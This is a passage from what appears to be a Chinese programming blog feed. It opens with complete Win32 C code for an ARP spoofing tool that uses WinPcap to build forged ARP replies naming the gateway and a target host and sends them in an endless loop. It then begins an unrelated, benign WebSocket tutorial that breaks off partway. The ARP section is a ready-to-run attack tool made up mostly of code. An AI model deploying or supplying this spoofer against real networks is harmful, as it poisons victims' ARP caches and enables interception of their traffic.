class="comment">//以太网帧类型表示后面数据的类型，对于ARP请求或应答来说，该字段的值为x0806</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARP_HARDWARE    1  <span class="comment">//硬件类型字段值为表示以太网地址</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_IP          0x0800  <span class="comment">//协议类型字段表示要映射的协议地址类型值为x0800表示IP地址</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARP_REQUEST     1   <span class="comment">//ARP请求</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARP_RESPONSE       2      <span class="comment">//ARP应答</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//14字节以太网首部</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EthernetHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	u_char DestMAC[<span class="number">6</span>];    <span class="comment">//目的MAC地址 6字节</span></span><br><span class="line">	u_char SourMAC[<span class="number">6</span>];   <span class="comment">//源MAC地址 6字节</span></span><br><span class="line">	u_short EthType;         <span class="comment">//上一层协议类型，如0x0800代表上一层是IP协议，0x0806为arp  2字节</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//28字节ARP帧结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArpHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> short hdType;   <span class="comment">//硬件类型</span></span><br><span class="line">	<span class="keyword">unsigned</span> short proType;   <span class="comment">//协议类型</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> hdSize;   <span class="comment">//硬件地址长度</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> proSize;   <span class="comment">//协议地址长度</span></span><br><span class="line">	<span class="keyword">unsigned</span> short op;   <span class="comment">//操作类型，ARP请求（1），ARP应答（2），RARP请求（3），RARP应答（4）。</span></span><br><span class="line">	u_char smac[<span class="number">6</span>];   <span class="comment">//源MAC地址</span></span><br><span class="line">	u_char sip[<span class="number">4</span>];   <span class="comment">//源IP地址</span></span><br><span class="line">	u_char dmac[<span class="number">6</span>];   <span class="comment">//目的MAC地址</span></span><br><span class="line">	u_char dip[<span class="number">4</span>];   <span class="comment">//目的IP地址</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* From tcptraceroute, convert a numeric IP address to a string */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPTOSBUFFERS	12</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">iptos</span><span class="params">(u_long in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> output[IPTOSBUFFERS][<span class="number">3</span>*<span class="number">4</span>+<span class="number">3</span>+<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">static</span> short which;</span><br><span class="line">	u_char *p;</span><br><span class="line"></span><br><span class="line">	p = (u_char *)&amp;in;</span><br><span class="line">	which = (which + <span class="number">1</span> == IPTOSBUFFERS ? <span class="number">0</span> : which + <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">sprintf</span>(output[which], <span class="string">"%d.%d.%d.%d"</span>, p[<span class="number">0</span>], p[<span class="number">1</span>], p[<span class="number">2</span>], p[<span class="number">3</span>]);</span><br><span class="line">	<span class="keyword">return</span> output[which];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Print all the available information on the given interface */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ifprint</span><span class="params">(<span class="keyword">pcap_if_t</span> *d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pcap_addr_t</span> *a;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Name */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,d-&gt;name);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Description */</span></span><br><span class="line">	<span class="keyword">if</span> (d-&gt;description)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\tDescription: %s\n"</span>,d-&gt;description);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Loopback Address*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\tLoopback: %s\n"</span>,(d-&gt;flags &amp; PCAP_IF_LOOPBACK)?<span class="string">"yes"</span>:<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IP addresses */</span></span><br><span class="line">	<span class="keyword">for</span>(a=d-&gt;addresses;a;a=a-&gt;next) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\tAddress Family: #%d\n"</span>,a-&gt;addr-&gt;sa_family);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(a-&gt;addr-&gt;sa_family)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> AF_INET:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\tAddress Family Name: AF_INET\n"</span>);</span><br><span class="line">			<span class="keyword">if</span> (a-&gt;addr)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"\tAddress: %s\n"</span>,iptos(((struct sockaddr_in *)a-&gt;addr)-&gt;sin_addr.s_addr));</span><br><span class="line">			<span class="keyword">if</span> (a-&gt;netmask)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"\tNetmask: %s\n"</span>,iptos(((struct sockaddr_in *)a-&gt;netmask)-&gt;sin_addr.s_addr));</span><br><span class="line">			<span class="keyword">if</span> (a-&gt;broadaddr)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"\tBroadcast Address: %s\n"</span>,iptos(((struct sockaddr_in *)a-&gt;broadaddr)-&gt;sin_addr.s_addr));</span><br><span class="line">			<span class="keyword">if</span> (a-&gt;dstaddr)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"\tDestination Address: %s\n"</span>,iptos(((struct sockaddr_in *)a-&gt;dstaddr)-&gt;sin_addr.s_addr));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\tAddress Family Name: Unknown\n"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IPSTRUCT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> IP[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prarseIP</span><span class="params">(<span class="keyword">char</span>* IP,IPSTRUCT* st)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *substr= strtok(IP,<span class="string">"."</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;IP[<span class="number">0</span>] = atoi(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"."</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;IP[<span class="number">1</span>] = atoi(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"."</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;IP[<span class="number">2</span>] = atoi(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"."</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;IP[<span class="number">3</span>] = atoi(substr);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hex2int</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((c &gt;= <span class="string">'A'</span>) &amp;&amp; (c &lt;= <span class="string">'Z'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> c - <span class="string">'A'</span> + <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((c &gt;= <span class="string">'a'</span>) &amp;&amp; (c &lt;= <span class="string">'z'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> c - <span class="string">'a'</span> + <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((c &gt;= <span class="string">'0'</span>) &amp;&amp; (c &lt;= <span class="string">'9'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> c - <span class="string">'0'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">HexToLLInt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* hexStr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> data[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(hexStr);</span><br><span class="line">	<span class="keyword">if</span> ((hexStr[len - <span class="number">1</span>] == <span class="string">'0'</span>) &amp;&amp; (hexStr[len - <span class="number">2</span>] == <span class="string">'/'</span>))</span><br><span class="line">		len -= <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;len; i += <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> low = hex2int(hexStr[i+<span class="number">1</span>]); <span class="comment">//低四位</span></span><br><span class="line">		<span class="keyword">int</span> high = hex2int(hexStr[i]);  <span class="comment">//高四位</span></span><br><span class="line">		data[count++] = (high &lt;&lt; <span class="number">4</span>) + low;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;count; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ret = ret &lt;&lt; <span class="number">8</span>;</span><br><span class="line">		ret += data[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MACSTRUCT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> MAC[<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prarseMAC</span><span class="params">(<span class="keyword">char</span>* IP,MACSTRUCT* st)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *substr= strtok(IP,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">0</span>] = HexToLLInt(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">1</span>] = HexToLLInt(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">2</span>] = HexToLLInt(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">3</span>] = HexToLLInt(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">4</span>] = HexToLLInt(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">5</span>] = HexToLLInt(substr);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//以太网目的mac ,被欺骗的MAC</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> ETHDestmac[<span class="number">6</span>];</span><br><span class="line">	<span class="comment">//以太网源mac,我们的mac</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> ETHSourcemac[<span class="number">6</span>];</span><br><span class="line">	<span class="comment">//ARP源mac，我们的mac</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> ARPSourcemac[<span class="number">6</span>];</span><br><span class="line">	<span class="comment">//ARP目的mac，被欺骗的mac</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> ARPDestmac[<span class="number">6</span>];</span><br><span class="line">	<span class="comment">//被欺骗的IP地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> ARPDip[<span class="number">4</span>];</span><br><span class="line">	<span class="comment">//网关IP</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> ARPSip[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">text</span>[<span class="number">66</span>];</span><br><span class="line">	printf_s(<span class="string">"请输入网关IP:"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;<span class="built_in">text</span>);</span><br><span class="line">	IPSTRUCT ips;</span><br><span class="line">	<span class="keyword">if</span>(!prarseIP(<span class="built_in">text</span>,&amp;ips))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"网关IP输入出错"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memcpy</span>(ARPSip,ips.IP,<span class="number">4</span>);</span><br><span class="line">	printf_s(<span class="string">"请输入目标IP:"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;<span class="built_in">text</span>);</span><br><span class="line">	<span class="keyword">if</span>(!prarseIP(<span class="built_in">text</span>,&amp;ips))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"目标IP输入出错"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memcpy</span>(ARPDip,ips.IP,<span class="number">4</span>);</span><br><span class="line">	printf_s(<span class="string">"请输入本机MAC:"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;<span class="built_in">text</span>);</span><br><span class="line">	MACSTRUCT macs;</span><br><span class="line">	<span class="keyword">if</span>(!prarseMAC(<span class="built_in">text</span>,&amp;macs))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"本机MAC输入出错"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memcpy</span>(ETHSourcemac,macs.MAC,<span class="number">6</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(ARPSourcemac,macs.MAC,<span class="number">6</span>);</span><br><span class="line">	printf_s(<span class="string">"请输入目标MAC:"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;<span class="built_in">text</span>);</span><br><span class="line">	<span class="keyword">if</span>(!prarseMAC(<span class="built_in">text</span>,&amp;macs))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"目标MAC输入出错"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memcpy</span>(ETHDestmac,macs.MAC,<span class="number">6</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(ARPDestmac,macs.MAC,<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">pcap_if_t</span> *alldevs;</span><br><span class="line">	<span class="keyword">pcap_if_t</span> *d;</span><br><span class="line">	<span class="keyword">char</span> errbuf[PCAP_ERRBUF_SIZE+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Retrieve the interfaces list */</span></span><br><span class="line">	<span class="keyword">if</span> (pcap_findalldevs(&amp;alldevs, errbuf) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Error in pcap_findalldevs: %s\n"</span>,errbuf);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/* Scan the list printing every entry */</span></span><br><span class="line">	<span class="keyword">for</span>(d=alldevs;d;d=d-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">		printf_s(<span class="string">"%d:"</span>,id);</span><br><span class="line">		id++;</span><br><span class="line">		ifprint(d);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> UseEID = <span class="number">0</span>;</span><br><span class="line">	printf_s(<span class="string">"请输入要使用的设备编号:"</span>);</span><br><span class="line">	scanf_s(<span class="string">"%d"</span>,&amp;UseEID);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 跳转到选中的适配器 */</span></span><br><span class="line">	<span class="keyword">for</span> (d = alldevs, id = <span class="number">0</span>; id &lt; UseEID; d = d-&gt;next, id++)</span><br><span class="line">		Sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">pcap_t</span> *adhandle;   <span class="comment">//打开网络适配器，捕捉实例,是pcap_open返回的对象</span></span><br><span class="line">	<span class="keyword">char</span> error[PCAP_ERRBUF_SIZE];</span><br><span class="line">	<span class="keyword">if</span>((adhandle = pcap_open_live(d-&gt;name, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1000</span>, error) ) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"\nError opening adapter: %s\n"</span>, error);</span><br><span class="line">		system(<span class="string">"pause"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> sendbuf[<span class="number">42</span>]; <span class="comment">//arp包结构大小，42个字节</span></span><br><span class="line"></span><br><span class="line">	EthernetHeader eh;</span><br><span class="line">	ArpHeader ah;</span><br><span class="line">	<span class="comment">//赋值MAC地址</span></span><br><span class="line">	<span class="built_in">memcpy</span>(eh.DestMAC, ETHDestmac, <span class="number">6</span>);   <span class="comment">//以太网首部目的MAC地址，全为广播地址</span></span><br><span class="line">	<span class="built_in">memcpy</span>(eh.SourMAC, ETHSourcemac, <span class="number">6</span>);   <span class="comment">//以太网首部源MAC地址</span></span><br><span class="line">	eh.EthType = htons(ETH_ARP);   <span class="comment">//htons：将主机的无符号短整形数转换成网络字节顺序</span></span><br><span class="line"></span><br><span class="line">	ah.hdType = htons(ARP_HARDWARE);</span><br><span class="line">	ah.proType = htons(ETH_IP);</span><br><span class="line">	ah.hdSize = <span class="number">6</span>;</span><br><span class="line">	ah.proSize = <span class="number">4</span>;</span><br><span class="line">	ah.op = htons(ARP_RESPONSE);</span><br><span class="line">	<span class="built_in">memcpy</span>(ah.smac, ARPSourcemac, <span class="number">6</span>);   <span class="comment">//ARP字段源MAC地址</span></span><br><span class="line">	<span class="built_in">memcpy</span>(ah.dmac, ARPDestmac, <span class="number">6</span>);   <span class="comment">//ARP字段目的MAC地址</span></span><br><span class="line">	<span class="built_in">memcpy</span>(ah.sip, ARPSip, <span class="number">4</span>);   <span class="comment">//ARP字段源IP地址</span></span><br><span class="line">	<span class="built_in">memcpy</span>(ah.dip, ARPDip, <span class="number">4</span>);   <span class="comment">//ARP字段目的IP地址</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//构造一个ARP请求</span></span><br><span class="line">	<span class="built_in">memset</span>(sendbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(sendbuf));   <span class="comment">//ARP清零</span></span><br><span class="line">	<span class="built_in">memcpy</span>(sendbuf, &amp;eh, <span class="keyword">sizeof</span>(eh));</span><br><span class="line">	<span class="built_in">memcpy</span>(sendbuf + <span class="keyword">sizeof</span>(eh), &amp;ah, <span class="keyword">sizeof</span>(ah));</span><br><span class="line">	</span><br><span class="line">	printf_s(<span class="string">"开始ARP欺骗"</span>);</span><br><span class="line">	<span class="comment">//监控数据包</span></span><br><span class="line">	<span class="comment">//pcap_loop(adhandle, 0, packet_handler, NULL);</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (pcap_sendpacket(adhandle, sendbuf, <span class="number">42</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"ARP欺骗succeed\n"</span>);</span><br><span class="line">			Sleep(<span class="number">500</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"PacketSendPacket in getmine Error: %d\n"</span>, GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>WebSocket</title>
    <url>/2020/11/07/WebSocket/</url>
    <content><![CDATA[<h1 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。</span><br><span class="line"></span><br><span class="line">它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。</span><br></pre></td></tr></table></figure>
<p>返回的状态码是101，这个东西在看直播的时候非常常见，弹幕八成就是这个东西，个人感觉比心跳包好用一些，减轻了比较多的压力。</p>
<p><img src="img1.jpg" alt="ws"></p>
<p>简单的编写一个websocket服务端，首先先下载一个<code>websocketd</code>作为服务端：<a href="http://websocketd.com" target="_blank" rel="noopener" title="websocketd">http://websocketd.com</a>其实自己写一个也是可以的，但是可能要对这个协议了解深入，我这里就不写了，有了这个服务端之后，我们需要指定一个开放的端口号：–port=8888 然后放一个自己写的程序上去。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">		Sleep(<span class="number">3000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行这个软件<br><code>websocketd.exe --port=8888 test.exe</code><br>服务端开启之后。回显：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sat, 07 Nov 2020 13:51:30 +0800 | INFO   | server     |  | Serving using application   : test.exe</span><br><span class="line">Sat, 07 Nov 2020 13:51:30 +0800 | INFO   | server     |  | Starting WebSocket server   : ws:&#x2F;&#x2F;XXXXXXX:8888&#x2F;</span><br></pre></td></tr></table></figure>
<p>这样子就可以了，我们要在前端进行调用的话呢，是很简单的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">'ws://127.0.0.1:8888/'</span>);</span><br><span class="line"></span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(event.data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="img2.jpg" alt="js"></p>
<p>前段时间有个爬虫需求就是写websocket的，然后不得不在应用程序中调用WebSocket，但是在网上找寻C++关于websocket的代码都是一些别人写好了的库，我不太喜欢自己不能控制的东西，出现了问题也不知道如何解决，所以我就自己写了一个websocket的函数作为调用，方便之后的开发，代码会放在文章底部。</p>
<p>先看一下效果：<br><img src="img3.jpg" alt="res"><br>和在浏览器控制台的效果是一样的。</p>
<p>首先我们包含写好的：<code>Ws.h</code><br><code>#include &quot;Ws.h&quot;</code><br>然后定义三个回调函数。</p>
<p>分别是：</p>
<ol>
<li>websocket连接成功的</li>
<li>websocket断开连接的</li>
<li>websocket收到消息的</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recThread</span><span class="params">(<span class="keyword">char</span>* recmessage,WINHTTP_WEB_SOCKET_BUFFER_TYPE rectype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	printf_s(<span class="string">"type:%d message:%s\n"</span>,rectype,recmessage);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">acceptThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	printf_s(<span class="string">"wait message\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destoryThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	printf_s(<span class="string">"WebSocket Destory\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>连接成功和连接失败的回调函数格式就是没有返回值，没有参数，只是通知。<br>收到消息的回调函数有两个参数，一个是收到的消息，还有一个是消息的类型。<br>这个消息的类型是一个枚举：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> _WINHTTP_WEB_SOCKET_BUFFER_TYPE &#123;</span><br><span class="line">	WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,</span><br><span class="line">	WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE,</span><br><span class="line">	WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,</span><br><span class="line">	WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE,</span><br><span class="line">	WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE</span><br><span class="line">&#125; WINHTTP_WEB_SOCKET_BUFFER_TYPE;</span><br></pre></td></tr></table></figure>
<p>看看名字就能了解个大半了。</p>
<p>写好回调函数之后就是开启我们的websocket：</p>
